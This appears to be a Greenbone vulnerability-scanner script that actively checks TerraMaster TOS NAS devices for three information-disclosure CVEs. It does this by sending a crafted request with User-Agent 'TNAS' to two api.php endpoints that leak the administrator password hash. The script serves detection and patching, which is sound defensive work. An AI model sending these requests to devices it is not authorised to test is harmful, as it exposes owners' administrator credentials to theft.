# Copyright (C) 2023 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE_PREFIX = "cpe:/o:terra-master:";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.149351");
  script_version("2023-02-22T10:10:00+0000");
  script_tag(name:"last_modification", value:"2023-02-22 10:10:00 +0000 (Wed, 22 Feb 2023)");
  script_tag(name:"creation_date", value:"2023-02-22 05:23:34 +0000 (Wed, 22 Feb 2023)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2022-05-05 14:25:00 +0000 (Thu, 05 May 2022)");

  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");

  script_cve_id("CVE-2021-45839", "CVE-2021-45842", "CVE-2022-24990");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Terramaster TOS < 4.2.31 Multiple Information Disclosure Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2023 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_terramaster_nas_http_detect.nasl");
  script_mandatory_keys("terramaster/nas/http/detected");
  script_require_ports("Services/www", 8181);

  script_tag(name:"summary", value:"Terramaster TOS is prone to multiple information disclosure
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - CVE-2021-45839: It is possible to obtain the first administrator's hash set up on the system as
  well as other information such as MAC address, internal IP address etc. by performing a request
  to the /module/api.php?mobile/webNasIPS endpoint.

  - CVE-2021-45842: It is possible to obtain the first administrator's hash set up on the system as
  well as other information such as MAC address, internal IP address etc. by performing a request
  to the /module/api.php?mobile/wapNasIPS endpoint.

  - CVE-2022-24990: TerraMaster NAS allows remote attackers to discover the administrative password
  by sending 'User-Agent: TNAS' to module/api.php?mobile/webNasIPS and then reading the PWD field
  in the response.");

  script_tag(name:"affected", value:"Terramaster TOS 4.2.29 and prior.");

  script_tag(name:"solution", value:"Update to version 4.2.31 or later.");

  script_xref(name:"URL", value:"https://thatsn0tmy.site/posts/2021/12/how-to-summon-rces/");
  script_xref(name:"URL", value:"https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www"))
  exit(0);

port = infos["port"];
cpe = infos["cpe"];

if (!get_app_location(cpe: cpe, port: port, nofork: TRUE))
  exit(0);

urls = make_list("/module/api.php?mobile/webNasIPS",
                 "/module/api.php?mobile/wapNasIPS");

user_agent = "TNAS";

foreach url (urls) {
  req = http_get_req(port: port, url: url, user_agent: user_agent);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if ('\\"firmware\\"' >< res || "\nPWD:" >< res) {
    report = "It was possible via " + http_report_vuln_url(port: port, url: url, url_only: TRUE) +
             ' to obtain possibly sensitive information.\n\nResult:\n\n' + res;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
